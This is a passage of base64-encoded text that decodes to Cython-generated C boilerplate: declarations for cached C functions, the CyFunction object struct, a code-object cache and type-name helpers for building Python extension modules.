1bmMpKHNlbGYsIGFyZ3MsIG5hcmdzLCBrd25hbWVzKQoKCnR5cGVkZWYgc3RydWN0IHsKICAgIFB5T2JqZWN0ICp0eXBlOwogICAgUHlPYmplY3QgKiptZXRob2RfbmFtZTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HICYmIENZVEhPTl9BVE9NSUNTCiAgICBfX3B5eF9hdG9taWNfaW50X3R5cGUgaW5pdGlhbGl6ZWQ7CiNlbmRpZgogICAgUHlDRnVuY3Rpb24gZnVuYzsKICAgIFB5T2JqZWN0ICptZXRob2Q7CiAgICBpbnQgZmxhZzsKfSBfX1B5eF9DYWNoZWRDRnVuY3Rpb247CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhfX1B5eF9DYWNoZWRDRnVuY3Rpb24gKmNmdW5jKSB7CiNpZiAhQ1lUSE9OX0FUT01JQ1MKICAgIHJldHVybiAxOwojZWxzZQogICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGV4cGVjdGVkID0gMDsKICAgIGlmIChfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSgmY2Z1bmMtPmluaXRpYWxpemVkLCAmZXhwZWN0ZWQsIDEpKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gZXhwZWN0ZWQ7CiNlbmRpZgp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX1NldEZpbmlzaGVkSW5pdGlhbGl6aW5nKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMpIHsKI2lmIENZVEhPTl9BVE9NSUNTCiAgICBfX3B5eF9hdG9taWNfc3RvcmUoJmNmdW5jLT5pbml0aWFsaXplZCwgMik7CiNlbmRpZgp9CiNlbHNlCiNkZWZpbmUgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uX0dldEFuZFNldEluaXRpYWxpemluZyhjZnVuYykgMgojZGVmaW5lIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYykKI2VuZGlmCgoKQ1lUSE9OX1VOVVNFRApzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpOwojZWxzZQojZGVmaW5lIF9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpICBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMikKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoY29uc3QgY2hhciogZnVuY19uYW1lLCBpbnQgZXhhY3QsCiAgICBQeV9zc2l6ZV90IG51bV9taW4sIFB5X3NzaXplX3QgbnVtX21heCwgUHlfc3NpemVfdCBudW1fZm91bmQpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoUHlPYmplY3QqIGl0ZW0sIFB5T2JqZWN0KiBzZXEsIGludCBlcSkgewogICAgaW50IHJlc3VsdCA9IFB5U2VxdWVuY2VfQ29udGFpbnMoc2VxLCBpdGVtKTsKICAgIHJldHVybiB1bmxpa2VseShyZXN1bHQgPCAwKSA/IHJlc3VsdCA6IChyZXN1bHQgPT0gKGVxID09IFB5X0VRKSk7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgZXhwZWN0ZWQpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKFB5X3NzaXplX3QgaW5kZXgpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9JdGVyRmluaXNoKHZvaWQpOwoKCnN0YXRpYyBpbnQgX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhQeU9iamVjdCAqcmV0dmFsLCBQeV9zc2l6ZV90IGV4cGVjdGVkKTsKCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spXAogICAgKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlQWRkKG9wMSwgb3AyKSA6IFB5TnVtYmVyX0FkZChvcDEsIG9wMikpCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRTbGljZSgKICAgICAgICBQeU9iamVjdCogb2JqLCBQeV9zc2l6ZV90IGNzdGFydCwgUHlfc3NpemVfdCBjc3RvcCwKICAgICAgICBQeU9iamVjdCoqIHB5X3N0YXJ0LCBQeU9iamVjdCoqIHB5X3N0b3AsIFB5T2JqZWN0KiogcHlfc2xpY2UsCiAgICAgICAgaW50IGhhc19jc3RhcnQsIGludCBoYXNfY3N0b3AsIGludCB3cmFwYXJvdW5kKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZyk7CgoKI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCkKI2RlZmluZSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgYWx3YXlzX2NhbGwsIHZpc2l0LCBhcmcpIDAKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoUHlPYmplY3QgKm8sIGludCBhbHdheXNfY2FsbCwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApOwojZW5kaWYKCgpzdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpOwojZGVmaW5lIF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHRwLCBrLCB2KSBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoKFB5VHlwZU9iamVjdCopdHAsIGssIHYpCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoUHlUeXBlX1NwZWMgKnNwZWMsIFB5VHlwZU9iamVjdCAqdHlwZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhQeU9iamVjdCAqZnVuYyk7CgoKc3RhdGljIGludCBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2QoUHlPYmplY3QgKm9iaiwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICoqbWV0aG9kKTsKCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSk7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgaW50IF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKGNvbnN0IGNoYXIgKnR5cGVfbmFtZSwgUHlfc3NpemVfdCBkaWN0b2Zmc2V0LCBQeU9iamVjdCAqYmFzZXMpOwojZW5kaWYKCgpDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX1JlYWR5KFB5VHlwZU9iamVjdCAqdCk7CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnQoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpmcm9tX2xpc3QsIGludCBsZXZlbCk7CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSk7CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlX1dhbGtQYXJ0cyhQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnBhcnRzX3R1cGxlKTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TGlzdF9QYWNrKFB5X3NzaXplX3QgbiwgLi4uKTsKCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ltcG9ydEZyb20oUHlPYmplY3QqIG1vZHVsZSwgUHlPYmplY3QqIG5hbWUpOwoKCiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseV9MZWZ0KG11bCwgc2VxKSAgX19QeXhfUHlTZXF1ZW5jZV9NdWx0aXBseShzZXEsIG11bCkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoUHlPYmplY3QgKnNlcSwgUHlfc3NpemVfdCBtdWwpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUodm9pZCk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9TZXREZWZhdWx0KFB5T2JqZWN0ICpkLCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqZGVmYXVsdF92YWx1ZSwgaW50IGlzX3NhZmVfdHlwZSk7CgoKc3RhdGljIFB5VHlwZU9iamVjdCogX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpOwoKCnN0YXRpYyBpbnQgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChQeU9iamVjdCAqbW9kdWxlKTsKI2RlZmluZSBfX1B5eF9Db21tb25UeXBlc01ldGFjbGFzc19VU0VECgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKTsKCgojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpOwojZW5kaWYKCgojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAojZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EICAweDAxCiNkZWZpbmUgX19QeXhfQ1lGVU5DVElPTl9DTEFTU01FVEhPRCAgIDB4MDIKI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NDTEFTUyAgICAgICAgMHgwNAojZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FICAgICAweDA4CiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbG9zdXJlKGYpXAogICAgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5mdW5jX2Nsb3N1cmUpCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKVwKICAgICAgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5mdW5jX2NsYXNzb2JqKQojZWxzZQogICNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKVwKICAgICAgKChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzKQojZW5kaWYKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1NldENsYXNzT2JqKGYsIGNsYXNzb2JqKVwKICAgIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSwgKGNsYXNzb2JqKSkKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0RlZmF1bHRzKHR5cGUsIGYpXAogICAgKCh0eXBlICopKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5kZWZhdWx0cykpCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c0dldHRlcihmLCBnKVwKICAgICgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5kZWZhdWx0c19nZXR0ZXIgPSAoZykKdHlwZWRlZiBzdHJ1Y3QgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3RfSEVBRAogICAgUHlPYmplY3QgKmZ1bmM7CiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMQogICAgUHlDRnVuY3Rpb25PYmplY3QgZnVuYzsKI2Vsc2UKICAgIFB5Q01ldGhvZE9iamVjdCBmdW5jOwojZW5kaWYKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8XAogICAgICAgIChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIENZVEhPTl9NRVRIX0ZBU1RDQUxMKQogICAgX19weXhfdmVjdG9yY2FsbGZ1bmMgZnVuY192ZWN0b3JjYWxsOwojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpmdW5jX3dlYWtyZWZsaXN0OwojZW5kaWYKICAgIFB5T2JqZWN0ICpmdW5jX2RpY3Q7CiAgICBQeU9iamVjdCAqZnVuY19uYW1lOwogICAgUHlPYmplY3QgKmZ1bmNfcXVhbG5hbWU7CiAgICBQeU9iamVjdCAqZnVuY19kb2M7CiAgICBQeU9iamVjdCAqZnVuY19nbG9iYWxzOwogICAgUHlPYmplY3QgKmZ1bmNfY29kZTsKICAgIFB5T2JqZWN0ICpmdW5jX2Nsb3N1cmU7CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKmZ1bmNfY2xhc3NvYmo7CiNlbmRpZgogICAgUHlPYmplY3QgKmRlZmF1bHRzOwogICAgaW50IGZsYWdzOwogICAgUHlPYmplY3QgKmRlZmF1bHRzX3R1cGxlOwogICAgUHlPYmplY3QgKmRlZmF1bHRzX2t3ZGljdDsKICAgIFB5T2JqZWN0ICooKmRlZmF1bHRzX2dldHRlcikoUHlPYmplY3QgKik7CiAgICBQeU9iamVjdCAqZnVuY19hbm5vdGF0aW9uczsKICAgIFB5T2JqZWN0ICpmdW5jX2lzX2Nvcm91dGluZTsKfSBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0OwojdW5kZWYgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhvYmopICBfX1B5eF9UeXBlQ2hlY2sob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSkKI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrMihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlLCAmUHlDRnVuY3Rpb25fVHlwZSkKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrRXhhY3Qob2JqKSAgX19QeXhfSVNfVFlQRShvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb24oUHlPYmplY3QgKmZ1bmMsIHZvaWQgKCpjZnVuYykodm9pZCkpOwojdW5kZWYgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uCiNkZWZpbmUgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKSAgIF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiBvcCwgUHlNZXRob2REZWYgKm1sLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpnbG9iYWxzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiBmLCBQeU9iamVjdCogY2xhc3NvYmopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0RGVmYXVsdHMoUHlPYmplY3QgKmZ1bmMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5VHlwZU9iamVjdCAqZGVmYXVsdHNfdHlwZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c1R1cGxlKFB5T2JqZWN0ICptLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqdHVwbGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKm0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGljdCk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXRBbm5vdGF0aW9uc0RpY3QoUHlPYmplY3QgKm0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpOwpzdGF0aWMgaW50IF9fcHl4X0N5RnVuY3Rpb25faW5pdChQeU9iamVjdCAqbW9kdWxlKTsKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEU19NRVRIT0QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGYpICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWYpLT5mdW5jX3ZlY3RvcmNhbGwpCiNlbHNlCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZikgKCgoUHlDRnVuY3Rpb25PYmplY3QqKWYpLT52ZWN0b3JjYWxsKQojZW5kaWYKI2VuZGlmCgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX05ldyhQeU1ldGhvZERlZiAqbWwsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIGNvZGUpOwoKCiNpZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLICYmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRQpzdGF0aWMgaW50IF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgaW50IGNfbGluZSk7CiNlbHNlCiNkZWZpbmUgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpICAoKChDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLKSkgPyBjX2xpbmUgOiAwKQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQp0eXBlZGVmIFB5T2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlOwojZWxzZQp0eXBlZGVmIFB5Q29kZU9iamVjdCBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZTsKI2VuZGlmCnR5cGVkZWYgc3RydWN0IHsKICAgIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdDsKICAgIGludCBjb2RlX2xpbmU7Cn0gX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnk7CnN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgewogICAgaW50IGNvdW50OwogICAgaW50IG1heF9jb3VudDsKICAgIF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgX19weXhfYXRvbWljX2ludF90eXBlIGFjY2Vzc29yX2NvdW50OwogICNlbmRpZgp9OwpzdGF0aWMgaW50IF9fcHl4X2Jpc2VjdF9jb2RlX29iamVjdHMoX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXMsIGludCBjb3VudCwgaW50IGNvZGVfbGluZSk7CnN0YXRpYyBfX1B5eF9DYWNoZWRDb2RlT2JqZWN0VHlwZSAqX19weXhfZmluZF9jb2RlX29iamVjdChpbnQgY29kZV9saW5lKTsKc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCk7CgoKc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHB5X2xpbmUsIGNvbnN0IGNoYXIgKmZpbGVuYW1lKTsKCgojaWYgIWRlZmluZWQoX19JTlRFTF9DT01QSUxFUikgJiYgZGVmaW5lZChfX0dOVUNfXykgJiYgKF9fR05VQ19fID4gNCB8fCAoX19HTlVDX18gPT0gNCAmJiBfX0dOVUNfTUlOT1JfXyA+PSA2KSkKI2RlZmluZSBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSk7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKdHlwZWRlZiBQeU9iamVjdCAqX19QeXhfVHlwZU5hbWU7CiNkZWZpbmUgX19QeXhfRk1UX1RZUEVOQU1FICIlVSIKI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKSBQeV9YREVDUkVGKG9iaikKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAojZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUgUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZQojZWxzZQpzdGF0aWMgX19QeXhfVHlwZU5hbWUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKTsKI2VuZGlmCiNlbHNlICAvLyAhTElNSVRFRF9BUEkKdHlwZWRlZiBjb25zdCBjaGFyICpfX1B5eF9UeXBlTmFtZTsKI2RlZmluZSBfX1B5eF9GTVRfVFlQRU5BTUUgIiUuMjAwcyIKI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKHRwKSAoKHRwKS0+dHBfbmFtZSkKI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKQojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBsb25nIF9fUHl4X1B5TG9uZ19Bc19sb25nKFB5T2JqZWN0ICopOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQXNfaW50KFB5T2JqZWN0